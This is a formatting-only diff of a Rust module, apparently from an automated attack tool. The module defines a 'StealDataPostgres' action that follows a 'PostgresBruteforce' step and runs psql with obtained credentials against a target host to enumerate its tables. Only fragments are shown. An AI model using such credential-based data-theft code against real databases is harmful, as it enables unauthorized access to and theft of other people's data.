@@ -13,9 +13,15 @@ use super::{build_output_dir, get_credentials};
 pub struct StealDataPostgres;
 
 impl Action for StealDataPostgres {
-    fn name(&self) -> &'static str { "StealDataPostgres" }
-    fn port(&self) -> Option<u16> { Some(5432) }
-    fn parent(&self) -> Option<&'static str> { Some("PostgresBruteforce") }
+    fn name(&self) -> &'static str {
+        "StealDataPostgres"
+    }
+    fn port(&self) -> Option<u16> {
+        Some(5432)
+    }
+    fn parent(&self) -> Option<&'static str> {
+        Some("PostgresBruteforce")
+    }
 
     fn execute<'a>(
         &'a self,
@@ -95,8 +101,15 @@ async fn steal_postgres_data(
             .env("PGPASSWORD", password)
             .env("PGCONNECT_TIMEOUT", "10")
             .args([
-                "-h", ip, "-U", user, "-d", db,
-                "-t", "-A", "-c",
+                "-h",
+                ip,
+                "-U",
+                user,
+                "-d",
+                db,
+                "-t",
+                "-A",
+                "-c",
                 "SELECT tablename FROM pg_tables WHERE schemaname = 'public'",
             ])
             .output()
